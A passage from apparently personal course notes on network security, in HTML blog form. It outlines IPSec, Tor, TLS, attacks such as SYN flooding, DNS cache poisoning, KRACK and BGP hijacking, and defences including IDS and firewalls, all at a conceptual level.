<li>Protects data from unauthroised disclosure and provides a limited form of traffic-flow confidentiality.<ul>
<li>conceals(hides) the source IP address, the destination IP address, the size of an IP datagram and frequency of communication</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li>Authentication Header(AH)<ul>
<li>INT, data-origin AUTH, anti-replay(Sequence number), access control, no CONF</li>
<li>can only <strong>authenticate</strong> data(IP payload and selected portion of IP header), and <strong>cannot encrypt</strong> data.</li>
</ul>
</li>
<li>Encapsulating Security Payload(ESP)<ul>
<li>anti-replay, CONF</li>
<li>encrypts and authenticates IP payload but not IP header</li>
</ul>
</li>
</ul>
<h3 id="IPSec-Modes"><a href="#IPSec-Modes" class="headerlink" title="IPSec Modes"></a>IPSec Modes</h3><ul>
<li>Transport Mode<ul>
<li>IP packet inserted with IPsec header</li>
</ul>
</li>
<li>Tunnel Mode<ul>
<li>original packet preserved, new header added/prepended.</li>
<li>ESP/AH Header is immediately after the New IP Header, original IP packet preserved</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>Transport Mode</th>
<th>Tunnel Mode</th>
</tr>
</thead>
<tbody><tr>
<td>AH</td>
<td>Authenticates IP payload and selected portions of IP header</td>
<td>Authenticates entire inner IP packet (inner header plus IP payload) plus a selected portion of the outer IP header.</td>
</tr>
<tr>
<td>ESP</td>
<td>Encrypts IP payload. Allows traffic analysis</td>
<td>Encrypts entire inner IP packet. No routers on the way can examine the inner IP header.</td>
</tr>
<tr>
<td>ESP+AUTH</td>
<td>Encrypts IP payload. Authenticates IP payload but not IP header</td>
<td>Encrypts entire inner IP packet. Authenticates inner IP packet.</td>
</tr>
</tbody></table>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221105101117217.png"></p>
<h3 id="Anti-replay-Services"><a href="#Anti-replay-Services" class="headerlink" title="Anti-replay Services"></a>Anti-replay Services</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221105105559855.png"></p>
<p>Cases</p>
<ul>
<li>If sequence number received now is smaller than the most left size of the current window, drop the packet.</li>
<li>If sequence number received now is within the current window range, check if packet has already been recived</li>
<li>If sequence number received now is greater than the max size of the current window, make the sequence number received now the max edge, and calculate the min edge through <code>N-W+1</code></li>
<li>If the recipient sets N=60 and the window size W=64, range should be 0-60</li>
</ul>
<h3 id="Security-Policy-Database-SPD"><a href="#Security-Policy-Database-SPD" class="headerlink" title="Security Policy Database(SPD)"></a>Security Policy Database(SPD)</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106101507795.png"></p>
<p><strong>3 IPSec policies:</strong></p>
<ul>
<li>DISCARD<ul>
<li>discard the packet</li>
</ul>
</li>
<li>PROTECT<ul>
<li>protect the packet with AH and the ESP security protocols</li>
</ul>
</li>
<li>BYPASS<ul>
<li>bypass the IPSec processing</li>
</ul>
</li>
</ul>
<h3 id="Security-Association-Database-SAD"><a href="#Security-Association-Database-SAD" class="headerlink" title="Security Association Database(SAD)"></a>Security Association Database(SAD)</h3><ul>
<li><p>AH info</p>
</li>
<li><p>ESP info</p>
</li>
<li><p>Lifetime of this SA</p>
</li>
<li><p>IPsec Protocol Mode</p>
<ul>
<li>Transparent/tunnel</li>
</ul>
</li>
</ul>
<h3 id="IPSec-Architecture"><a href="#IPSec-Architecture" class="headerlink" title="IPSec Architecture"></a>IPSec Architecture</h3><ul>
<li>Authentication Header(AH)<ul>
<li>An extension header for message authentication</li>
</ul>
</li>
<li>Encapsulating Security Payload(ESP)<ul>
<li>provides encryption for combined encryption/msg INT</li>
</ul>
</li>
<li>Internet Key Exchange(IKE)<ul>
<li>the key management schemes for use with IPSec</li>
</ul>
</li>
</ul>
<h3 id="Virtual-Private-Networks-VPN"><a href="#Virtual-Private-Networks-VPN" class="headerlink" title="Virtual Private Networks(VPN)"></a>Virtual Private Networks(VPN)</h3><p>Isolation</p>
<p>Tunneling</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106103411619.png"></p>
<p>Many logical overlay networks co-exist</p>
<ul>
<li>over the same physical network</li>
<li>provide its own dedicated service</li>
</ul>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><ul>
<li>Which one is better?<ul>
<li>Placing VPN server behind the firewall</li>
<li>Placing VPN server in front of the firewall</li>
<li>Anwser<ul>
<li>VPN in front of the firewall is better. VPN has the function of firewall as well, after the VPN gateway, the message will be decrypted so that Firewall can look into the details of the package.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h3><h4 id="Components-for-Tor"><a href="#Components-for-Tor" class="headerlink" title="Components for Tor"></a>Components for Tor</h4><ul>
<li>Client</li>
<li>Server</li>
<li>Tor(onion) router: the special proxy relays the application adata</li>
<li>Directory server: servs holding Tor router information</li>
</ul>
<h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The last router will see the clear data but not be knowing where the message from.</p>
<p>Every router only knows the predecessor and successor.</p>
<p><strong>Send Message from client:</strong></p>
<ol>
<li><p>Client obtains a list of Tor nodes from a <strong>directory server</strong></p>
</li>
<li><p>Client picks a random path to destination server.</p>
</li>
<li><p>Client negotiates an AES key with <strong>each router</strong>(every router has its own encryption key).</p>
</li>
<li><p>Client encrypts message</p>
<ul>
<li>C3 = Encrypt(K3, data||IP_Server)</li>
<li>C2 = Encrypt(K2, C3 || IP_OR3)</li>
<li>C1 = Encrypt(K1, C2 || IP_OR2)</li>
</ul>
</li>
<li><p>Client sends an IP packet as: IP_Client || IP_OR1 || C1</p>
<ul>
<li>send IP packet that is consist of current router/machine’s IP, next destination’s IP and encryped message</li>
</ul>
</li>
</ol>
<ul>
<li><p>Packet arrives at OR1 and OR1 performs:</p>
<ul>
<li>C2 || IP_OR2 = DEC(K1, C1)</li>
<li>caches IP_Client, IP_OR2</li>
<li>sents an IP packet as: IP_OR1 || IP_OR2 || C2</li>
</ul>
</li>
<li><p>Packet arrives at OR2 and OR2 performs:</p>
<ul>
<li>C3 || IP_OR3 = DEC(K2, C2)</li>
<li>caches IP_OR1 || IP_OR3</li>
<li>sents an IP packet as IP_OR2 || IP_OR3 || C3</li>
</ul>
</li>
<li><p>Packet arrvies at OR3 and OR3 performs:</p>
<ul>
<li>IP_Server || data = DEC(K3,C3)</li>
<li>Caches IP_OR2, IP_Server</li>
<li>sents an IP packet as IP_OR3 || IP_SERVER || data</li>
</ul>
</li>
</ul>
<h2 id="Week-5-Transport-Layer-Security-TLS"><a href="#Week-5-Transport-Layer-Security-TLS" class="headerlink" title="Week 5: Transport Layer Security (TLS)"></a>Week 5: Transport Layer Security (TLS)</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>TLS sits <strong>between</strong> the Transport layer and Application layer(not belong to any of them).</p>
<ul>
<li>Unsurported data =&gt; given to TLS by <strong>application layer</strong></li>
<li>TLS gives protected data to <strong>transport layer</strong>.</li>
</ul>
<p>Confidentiality</p>
<ul>
<li>Nobody other than the two ends of the channel can see the actual content of the data transmitted.</li>
</ul>
<p>Integrity</p>
<ul>
<li>Channel can detect any changes</li>
</ul>
<p>Authentication</p>
<ul>
<li>At least one end of the channel needs to be authenticated, so the other end knows who it is talking to.</li>
</ul>
<h3 id="Stages"><a href="#Stages" class="headerlink" title="Stages"></a>Stages</h3><ul>
<li><p>Setup: TLS handshake</p>
<ul>
<li><a href="https://leihehe.top/2022/06/12/Security-Protocols/">https://leihehe.top/2022/06/12/Security-Protocols/</a></li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106220121668.png"></li>
</ul>
</li>
<li><p>Secure Chanel: TLS Record</p>
<ul>
<li><p>Each record contains a header and a payload.</p>
<ul>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106221639327.png"></li>
<li>Break stream in series of records<ul>
<li>each record carries a MAC</li>
<li>receiver can act on each record as it arrives</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Send data process</strong></p>
<ul>
<li>Get data from application layer</li>
<li>Fragement</li>
<li>Compress(optional)</li>
<li>Add MAC and padding</li>
<li>Encrypt</li>
<li>Add TLS header</li>
</ul>
</li>
<li><p><strong>Receive data process</strong></p>
<ul>
<li>Decrypt</li>
<li>Check integrity<ul>
<li>use variable-length records to distinguish MAC from data</li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221107102250059.png"></li>
</ul>
</li>
<li>Decompress</li>
<li>Buffered</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Trunction-Attack"><a href="#Trunction-Attack" class="headerlink" title="Trunction Attack"></a>Trunction Attack</h3><p>Attacker forges TCP connection close segment</p>
<p>one or both sides think there is less data than there actually is</p>
<p><strong>Solution</strong>: record types, with one type for closure</p>
<ul>
<li>Type 0 for data, Type closure</li>
</ul>
<h3 id="POODLE-Attack"><a href="#POODLE-Attack" class="headerlink" title="POODLE Attack"></a>POODLE Attack</h3><p>it takes advantage of CBC mode (SSL V3.0).</p>
<ul>
<li>The client initiates handshake and sends client_hello</li>
<li>The attacker intercepts via MITM attack, and impersonates the server until the client agrees to downgrade to v3.0</li>
</ul>
<h3 id="Attack-Scenario"><a href="#Attack-Scenario" class="headerlink" title="Attack Scenario"></a>Attack Scenario</h3><p>Attacker intercepts the channel between client and web server and injects ciphertexts</p>
<p>Server responses that an attacker can explore:</p>
<ul>
<li>Case 1: Valid ciphertext and padding</li>
<li>Case 2: Invalid ciphertext with invalid padding</li>
<li>Case 3: Invalid ciphertext but valid padding</li>
</ul>
<h3 id="Countermeasures"><a href="#Countermeasures" class="headerlink" title="Countermeasures"></a>Countermeasures</h3><ul>
<li><p>Remove server response</p>
</li>
<li><p>Use AES GCM model - authenticated encryption</p>
<ul>
<li>Ensure that the ciphertext is not modified during the transmission</li>
</ul>
</li>
</ul>
<h2 id="Week-6-Network-Attacks"><a href="#Week-6-Network-Attacks" class="headerlink" title="Week 6: Network Attacks"></a>Week 6: Network Attacks</h2><h3 id="Review-Questions"><a href="#Review-Questions" class="headerlink" title="Review Questions"></a>Review Questions</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221114100445315.png"></p>
<p>Network Level</p>
<ul>
<li>VPN, IPSEC</li>
<li>good when you want to encrypt everything(traffic)</li>
</ul>
<p>Transport Level</p>
<ul>
<li>TLS<ul>
<li>services provided<ul>
<li>Confidentiality<ul>
<li>Encryption</li>
</ul>
</li>
<li>Integrity<ul>
<li>MAC</li>
</ul>
</li>
<li>Authentication</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Application Level</p>
<h3 id="SYN-Flooding-Attack"><a href="#SYN-Flooding-Attack" class="headerlink" title="SYN Flooding Attack"></a>SYN Flooding Attack</h3><h4 id="TCP-3-way-Handshake"><a href="#TCP-3-way-Handshake" class="headerlink" title="TCP 3-way Handshake"></a>TCP 3-way Handshake</h4><p>According to TCP 3-way handshake Protocol, when the server recievs the initial SYN pakcet, it uses TCB(Transmisson Control Block) to store the information about the connection</p>
<ul>
<li>This is called half-open connection as only client-server connection is comfirmed.</li>
<li>The server stores the TCB in a queue that is only for the half-open connection.</li>
</ul>
<p>After the server gets ACK packet, it will take this TCB out of queue and store in a different place.</p>
<h4 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h4><p>Continuously send a lot of SYN packets to the server using spoofed ip addresses. This consumes the space in the queue by inserting the TCB record.</p>
<p>Do not finish the 3rd stop of hanshake as it dequeue the TCB record</p>
<h4 id="Contermeasure-SYN-Cookies"><a href="#Contermeasure-SYN-Cookies" class="headerlink" title="Contermeasure: SYN Cookies"></a>Contermeasure: SYN Cookies</h4><ul>
<li>After receiving a SYN packet, the server will calculate a keyed hash in terms of the SYN packet using a <strong>secret key</strong>.</li>
<li>This hash(H) is sent to the client(ip address) as the initial sequence number from the server. H is called SYN cookie.</li>
<li><strong>The server will not store the half-open connection in its queue.</strong></li>
<li><strong>Attacker will not recived H because of the fake IP address.</strong></li>
<li>Normal client will send H+1 to the server, and server will check it.</li>
</ul>
<h4 id="Week-Countermeasure"><a href="#Week-Countermeasure" class="headerlink" title="Week Countermeasure"></a>Week Countermeasure</h4><ul>
<li>Do not store any information about SYN packet.<ul>
<li>ACK flood attack, no corresponding ack number and seq number stored in the buffer.</li>
</ul>
</li>
</ul>
<h3 id="TCP-Reset-Attack"><a href="#TCP-Reset-Attack" class="headerlink" title="TCP Reset Attack"></a>TCP Reset Attack</h3><ul>
<li><p>stop the connection between two hosts.</p>
</li>
<li><p>use RST(header) packet to immediately break the conneciton.</p>
<ul>
<li>get corresponding information from the last packet(sequence number, source port, etc)</li>
</ul>
</li>
<li><p><strong>Can TLS mitigate this attack?</strong></p>
<ul>
<li><p>NO. TLS is on top of TCP, TLS cannot protect the header of TCP, so RST can still be set.</p>
</li>
<li><p><strong>Solution:</strong></p>
<ul>
<li>IDS</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="TCP-Session-Hijacking-Attack"><a href="#TCP-Session-Hijacking-Attack" class="headerlink" title="TCP Session Hijacking Attack"></a>TCP Session Hijacking Attack</h3><ul>
<li><p>What can a hacker do?</p>
<ul>
<li><p>Capture the packet and get the <code>next sequence number</code> and <code>acknowledgement number</code></p>
</li>
<li><p>Forge a packet using the information got previously.</p>
<ul>
<li>Trying to make the packet valid</li>
</ul>
</li>
<li><p>Successfully take over the session</p>
</li>
</ul>
</li>
<li><p><strong>Solution</strong></p>
<ul>
<li>making it difficult for attackers to spoof packets<ul>
<li>Randomise initial sequence number</li>
<li>Randomise source port number</li>
</ul>
</li>
<li>Encrypting TCP payload and header</li>
</ul>
</li>
</ul>
<h3 id="DNS-Protocols"><a href="#DNS-Protocols" class="headerlink" title="DNS Protocols"></a>DNS Protocols</h3><h4 id="Authoritative-Name-Servers"><a href="#Authoritative-Name-Servers" class="headerlink" title="Authoritative Name Servers"></a>Authoritative Name Servers</h4><ul>
<li>Each DNS zone has at least one authoritative nameserver that publishes information about the zone.</li>
<li>It provides the original and definitive answers to DNS queries.</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221107162059195.png"></p>
<h4 id="Local-DNS-cache-poisoning-attack"><a href="#Local-DNS-cache-poisoning-attack" class="headerlink" title="Local DNS cache poisoning attack"></a>Local DNS cache poisoning attack</h4><ul>
<li>Attack on user machines<ul>
<li>attacker sends a fake DNS response with an evil IP address to the user machine which sent out a DNS query.</li>
</ul>
</li>
<li>Attack on local DNS server(Cache Poisoning attack)<ul>
<li>When the local DNS server sends out iterative queries to get an answer from the DNS servers on the internet, attackers can send out spoofed replies to the local DNS server.</li>
<li>They get accepted as long as they arrive before the actual replies.</li>
</ul>
</li>
</ul>
<h4 id="Remote-DNS-cache-poisoning-attack"><a href="#Remote-DNS-cache-poisoning-attack" class="headerlink" title="Remote DNS cache poisoning attack"></a>Remote DNS cache poisoning attack</h4><p>Remote DNS cache poisoning attack needs to guess the port number, transaction ID, etc.</p>
<p><strong>Cache effect</strong>: if no attempt fails, the actual reply will be cached by the local DNS server; the attacker needs to wait for the cache to timeout for the next attempt.</p>
<p><strong>The Kaminsky Attack</strong>: ask a different question every time, and guess the transaction id and port number.</p>
<h5 id="Countermeasures-1"><a href="#Countermeasures-1" class="headerlink" title="Countermeasures"></a>Countermeasures</h5><ul>
<li><p><strong>DNSSEC</strong></p>
<ul>
<li>provide authentication and integrity checking on DNS data, not confidentiality.</li>
<li>No client/server setup “dialog”.</li>
<li>Check <strong>digital signatures</strong> -&gt; check if the information is authentic or not.</li>
<li>depend on trust in the Root Name Server’s key, and all other signing keys</li>
</ul>
</li>
<li><p><strong>TLS/SSL</strong></p>
<ul>
<li>Client &amp; server agree on crypto, session keys</li>
<li>depend on trust in Certificate Authorities/decision to sign keys</li>
</ul>
</li>
</ul>
<h2 id="Week-7-Wireless-Security"><a href="#Week-7-Wireless-Security" class="headerlink" title="Week 7: Wireless Security"></a>Week 7: Wireless Security</h2><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>Basic building block of an 802.11 WLAN:</p>
<ul>
<li>AP(BSS) and clients</li>
</ul>
<p>Define an Extended Service set</p>
<ul>
<li>Network of multiple BSS using Distribution System. e.g. eduroam</li>
</ul>
<p>Security areas addressed by IEEE 802.11i</p>
<ul>
<li>Authentication, Confidentiality and integrity.</li>
</ul>
<p>Difference between TKIP and CCMP</p>
<ul>
<li><p>TKIP(Temporal Key Integrity Protocol) was introduced to improve security of WEP</p>
</li>
<li><p>CCMP(Computer mode anad Cipher Block Chaining Protocol) is sued in WPA2, it provides authentication, integrity and confidentiality.</p>
</li>
</ul>
<h3 id="Threats"><a href="#Threats" class="headerlink" title="Threats"></a>Threats</h3><ul>
<li>Man-in-the-Middle attack</li>
<li>Identity theft, media accesss control(MAC) address spoofing</li>
<li>Ad hoc networks</li>
<li>Denial of Service(DoS)</li>
<li>Network injection</li>
</ul>
<h3 id="Wired-Equivalent-Privacy-WEP"><a href="#Wired-Equivalent-Privacy-WEP" class="headerlink" title="Wired Equivalent Privacy(WEP)"></a>Wired Equivalent Privacy(WEP)</h3><ul>
<li><p><strong>Improper IV management</strong></p>
<ul>
<li>Can detect when IV reused<ul>
<li>IV collision</li>
</ul>
</li>
</ul>
</li>
<li><p>WEP recommends</p>
<ul>
<li>IV changed per packet</li>
<li>some WEP implementations weak</li>
</ul>
</li>
<li><p>Messages can be modified without knowing the key</p>
</li>
<li><p>CRC32 not a MAC</p>
<ul>
<li>is linear</li>
</ul>
</li>
<li><p>CRC32 used with a stream cipher</p>
<ul>
<li>stream cipher is linear</li>
</ul>
</li>
<li><p>can modify ciphertext without disctributing m</p>
</li>
</ul>
<h3 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h3><h4 id="The-4-way-handshake"><a href="#The-4-way-handshake" class="headerlink" title="The 4-way handshake"></a>The 4-way handshake</h4><ul>
<li>used to connect to any protected Wi-Fi network<ul>
<li>provides mutual authentication</li>
<li>Negotiates fresh PTK: pairwise temporal key</li>
</ul>
</li>
</ul>
<h4 id="Reinstallation-Attack"><a href="#Reinstallation-Attack" class="headerlink" title="Reinstallation Attack"></a>Reinstallation Attack</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221108132402663.png"></p>
<p>After the client receives <code>msg3</code>, the client will install the key. Once the key is installed, it will be used to encrypt data frames and send <code>msg4</code> to AP. If AP did not receive <code>msg4</code>, it will re-transmit the <code>msg3</code>, client will re-install the same encryption key and thereby reset the <strong>incremental transmit packet number (nonce)</strong> and receive the replay counter used by the encryption protocol.</p>
<blockquote>
<p>As a result, <strong>the same encryption key is used with nonce values that have already been used in the past</strong>. In turn, this causes all encryption protocols of WPA2 to reuse <a href="https://en.wikipedia.org/wiki/Keystream">keystream</a> when encrypting packets. In case a message that reuses keystream has known content, it becomes trivial to derive the used keystream. This keystream can then be used to decrypt messages with the same nonce. </p>
</blockquote>
<p><strong>Solution</strong></p>
<ul>
<li>Do not retransmit message 3/4</li>
</ul>
<h3 id="Jamming"><a href="#Jamming" class="headerlink" title="Jamming"></a>Jamming</h3><p>Transmitting a continuous jamming signal or several short jamming pulses causes DoS</p>
<p><strong>Detection</strong></p>
<ul>
<li><p>monitor signal strength</p>
</li>
<li><p>monitor carrier sensing time</p>
</li>
</ul>
<h2 id="Week-8-Intrusion-Detection-System-IDS"><a href="#Week-8-Intrusion-Detection-System-IDS" class="headerlink" title="Week 8: Intrusion Detection System(IDS)"></a>Week 8: Intrusion Detection System(IDS)</h2><h3 id="Intruders"><a href="#Intruders" class="headerlink" title="Intruders"></a>Intruders</h3><p>Masquerade</p>
<ul>
<li>outsider in general</li>
</ul>
<p>Misfeasor</p>
<ul>
<li>Insider in general</li>
</ul>
<p>Clandestine</p>
<ul>
<li>can be both</li>
</ul>
<h3 id="Design-Goals"><a href="#Design-Goals" class="headerlink" title="Design Goals"></a>Design Goals</h3><ul>
<li>Detect a wide variety of intrusions<ul>
<li>cover known and unknown attacks</li>
<li>Adapt to new attacks or changes in behaviour</li>
</ul>
</li>
<li>Detect intrusions in real-time<ul>
<li>analyse user activities efficiently</li>
<li>Report suspicious cases timely</li>
</ul>
</li>
<li>Ensure accuracy<ul>
<li>minimise false positives and false negatives</li>
</ul>
</li>
</ul>
<h3 id="IDS-Models"><a href="#IDS-Models" class="headerlink" title="IDS Models"></a>IDS Models</h3><ul>
<li>Signature-based<ul>
<li>unusual behaviours are known</li>
<li>pro<ul>
<li>effective and efficient at detecting known threats</li>
<li>less false positive</li>
<li>Raise alarm when activities match the signature</li>
</ul>
</li>
<li>con<ul>
<li>ineffective at detecting unknown threats and many variants of known threats</li>
<li>cannot track and understand the state of complex communication, so it cannot detect most attacks that consist of multiple events.</li>
<li>hard to keep signature updates</li>
</ul>
</li>
</ul>
</li>
<li>Anomaly-based<ul>
<li>Usual behaviours are known</li>
<li>Raise alarm when activities deviate from the usual behaviour</li>
<li>pro<ul>
<li>can detect the unknown attack</li>
<li>can use a new user profile to update</li>
</ul>
</li>
<li>con<ul>
<li>it requires more time and processing capacity than signature-based IDS(less efficient to identify the behaviours)</li>
<li>it may generate false positives(a normal activity is recognised as malicious) and false negative(a malicious activity is recognised as normal)</li>
</ul>
</li>
</ul>
</li>
<li>Heuristic-based<ul>
<li>Use a machine learning model for normal behaviour</li>
<li>Raise alarm when activities are identified as abnormal by the model</li>
<li>pro<ul>
<li>reveal the hidden pattern in complicated data</li>
<li>it is adaptive to the change in users’ behaviours</li>
</ul>
</li>
<li>con<ul>
<li>Lack of training data</li>
<li>a model can be poisoned by adversarial input</li>
<li>still have many false positives</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="IDS-Architecture"><a href="#IDS-Architecture" class="headerlink" title="IDS Architecture"></a>IDS Architecture</h3><ul>
<li><p>Auditor</p>
<ul>
<li>record all security-relevant activities for analysis</li>
</ul>
</li>
<li><p>Analyser</p>
<ul>
<li>Automatically analyse the data from the auditor</li>
<li>update auditor and analyser settings when needed</li>
</ul>
</li>
<li><p>Notifier</p>
<ul>
<li>Report detected anomaly</li>
<li>Update auditor and analyser settings when needed</li>
<li>Initiate countermeasures</li>
</ul>
</li>
</ul>
<h3 id="IDS-Types"><a href="#IDS-Types" class="headerlink" title="IDS Types"></a>IDS Types</h3><ul>
<li>Host-based IDS<ul>
<li>Deploy in local system to detect malicious activities on a single device.</li>
<li>It can be sued tas a distributed system in the network.</li>
<li>Pros<ul>
<li>low cost since most of the HIDS is software-based</li>
<li>can see low-level activities</li>
<li>low error rate for local threats</li>
</ul>
</li>
<li>Cons:<ul>
<li>limited view on the network</li>
<li>malicious insider can tamper the system</li>
</ul>
</li>
</ul>
</li>
<li>Network-based IDS(NIDS)<ul>
<li>Monitor the traffic on the entire network to detect instrusions</li>
<li>Pros:<ul>
<li>can see attacks in network traffic especially in Transport layer or IP layer.</li>
<li>Hard to temper</li>
</ul>
</li>
<li>Cons<ul>
<li>dedicated hardware may be needed.</li>
<li>difficult to check the encrypted traffic.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall"></a>Firewall</h3><h4 id="Overview-2"><a href="#Overview-2" class="headerlink" title="Overview"></a>Overview</h4><p>A network security device that monitors incoming and outgoing network traffic and decides whether to allow or block specific traffic based on a defined set of security rules.</p>
<h4 id="Cloud-based-Web-Application-Firewall"><a href="#Cloud-based-Web-Application-Firewall" class="headerlink" title="Cloud-based Web Application Firewall"></a>Cloud-based Web Application Firewall</h4><ul>
<li>In-house hardware firewall =&gt; virtualisation</li>
<li>Reduced local cost increased service scalability</li>
<li><strong>Concern on Privacy</strong><ul>
<li>Traffic contains sensitive information</li>
<li>Rules are also proprietary</li>
<li>Threats<ul>
<li>Cloud(insider) or attacker that breaks into the cloud are interested in rules and traffic contents</li>
</ul>
</li>
</ul>
</li>
<li><strong>Concern on Integrity</strong><ul>
<li>Cheating service provider</li>
<li>Software bugs misconfigurations</li>
</ul>
</li>
</ul>
<h4 id="Sliding-window-Based-Tokenisation"><a href="#Sliding-window-Based-Tokenisation" class="headerlink" title="Sliding-window Based Tokenisation"></a>Sliding-window Based Tokenisation</h4><ul>
<li><p><code>Att-&gt;tta-&gt;tac-&gt;ack-&gt;cke-&gt;ker</code></p>
<ul>
<li>like a sliding window</li>
<li>divides the words into small windows and make rules to detect malicious words.</li>
</ul>
</li>
<li><p><strong>Issues</strong></p>
<ul>
<li><p>Will consume a lot of memory, may slow down your network.</p>
</li>
<li><p>It may drop some of non-malicious or the original legitimate traffic because you made the rules and that pattern may actually occur in other strings.</p>
</li>
<li><p>The large brandwith cost.</p>
</li>
<li><p>Frequency analysis happens will there are the same contents since the same strings will be encrypted to the same token.</p>
<ul>
<li><p><strong>Solution</strong></p>
<ul>
<li><p>Cloud firewall <strong>should only know matches</strong> on suspicious strings</p>
</li>
<li><p><strong>Adding salt</strong></p>
<ul>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221108154033521.png"></li>
<li>Trade-off<ul>
<li>The needed storage of the rules increased</li>
<li>The storage of the gateway needs to be increased(for storing counters)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Limitations of current protocols</p>
<ul>
<li><p>The large brandwith cost due to sliding-window-based tokenisation</p>
</li>
<li><p>Limited functionality - only pattern/header matching only</p>
</li>
</ul>
</li>
</ul>
<h4 id="Stateful-amp-Stateless-Firewall"><a href="#Stateful-amp-Stateless-Firewall" class="headerlink" title="Stateful &amp; Stateless Firewall"></a>Stateful &amp; Stateless Firewall</h4><p>Stateless filrewall takes every packet independently to decide whether to drop it or not, because it does not save the state.</p>
<ul>
<li>consume a lot of resources</li>
</ul>
<p>Stateful Firewall</p>
<ul>
<li><p>Get a few packets add see if they are allowed to acually go through. </p>
</li>
<li><blockquote>
<p>Stateful firewalls <strong>intercept packets at the network layer and then derive and analyze data from all communication layers to improve security</strong>. Information about connection state and other contextual data is stored and dynamically updated.</p>
</blockquote>
</li>
<li><p>Challenges</p>
<ul>
<li>need more spaces to store the states.</li>
</ul>
</li>
</ul>
<h2 id="Week-10-BGP-and-BGP-Security"><a href="#Week-10-BGP-and-BGP-Security" class="headerlink" title="Week 10: BGP and BGP Security"></a>Week 10: BGP and BGP Security</h2><h3 id="Autonomous-System-AS"><a href="#Autonomous-System-AS" class="headerlink" title="Autonomous System (AS)"></a>Autonomous System (AS)</h3><blockquote>
<p>Autonomous System in networking is a collection of one or more associated Internet Protocol (IP) prefixes with a clearly defined <strong>routing policy</strong> that governs how the AS exchanges routing information with other autonomous systems.</p>
</blockquote>
<ul>
<li><p>ASN</p>
<ul>
<li>Autonomous System Number(ASN) is a globally unique identifier of a AS</li>
</ul>
</li>
<li><p>AS Path</p>
<ul>
<li>AS Path Attribute is a list of AS numbers that the router traverse to reach a destination IP/Network.</li>
</ul>
</li>
<li><p>BGP Speaker</p>
<ul>
<li>A router running BGP is a BGP speaker</li>
</ul>
</li>
<li><p>BGP Peer</p>
<ul>
<li>Two routers that have stablished connections for exchanging BGP information</li>
</ul>
</li>
<li><p>Types</p>
<ul>
<li>Stub AS<ul>
<li>end customers, do not provide transit to others</li>
</ul>
</li>
<li>Transit AS<ul>
<li>Provide transit to others</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Types-of-BGP-connections"><a href="#Types-of-BGP-connections" class="headerlink" title="Types of BGP connections"></a>Types of BGP connections</h3><ul>
<li>EBGP(External BGP)<ul>
<li>For BGPs from different AS</li>
</ul>
</li>
<li>IBGP(Internal BGP)<ul>
<li>For BGPs from the same AS</li>
</ul>
</li>
</ul>
<h3 id="Border-Gateway-Protocol-BGP"><a href="#Border-Gateway-Protocol-BGP" class="headerlink" title="Border Gateway Protocol (BGP)"></a>Border Gateway Protocol (BGP)</h3><h4 id="IP-Prefix-Announcement"><a href="#IP-Prefix-Announcement" class="headerlink" title="IP Prefix Announcement"></a>IP Prefix Announcement</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221109101915386.png"></p>
<p><strong>Path selection</strong>: by default, the selector will choose the shortest path.</p>
<h3 id="IP-Anycast"><a href="#IP-Anycast" class="headerlink" title="IP Anycast"></a>IP Anycast</h3><ul>
<li>Multiple machines share the same IP</li>
<li>Naturally supported by BGP</li>
<li>Routing decides which one gets the packet</li>
</ul>
<h3 id="Routing-Rule"><a href="#Routing-Rule" class="headerlink" title="Routing Rule"></a>Routing Rule</h3><ul>
<li>Longest match wins<ul>
<li>e.g. packets to 10.164.0.71 will match both 10.164.0.0/25 and 10.164.0.0/24<ul>
<li>10.164.0.0/25 will be selected because it has 25 bits of the match, while the second only has 24bit of the match.</li>
</ul>
</li>
<li><strong>BGP Hijacking Attack</strong><ul>
<li>BGP does not have a mechanism to verify the ownership of a network perfix</li>
<li>Malicious BGP routers can announce fake network prefixes</li>
<li><strong>Solution</strong><ul>
<li><strong>Filtering: Active monitoring</strong><ul>
<li>Using filters, we can block the prefixes with longer lengths</li>
</ul>
</li>
<li><strong>Resource public key infrastructure</strong><ul>
<li>new route needs to be signed by a trusted authority</li>
<li>Verify the ownership of IP prefix</li>
</ul>
</li>
<li>BGPSec<ul>
<li>it is cryptographically and authenticating the whole path in BGP messages. When it reaches one of. the router, it will have signatures from everyone so that you can verify that where it comes from.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
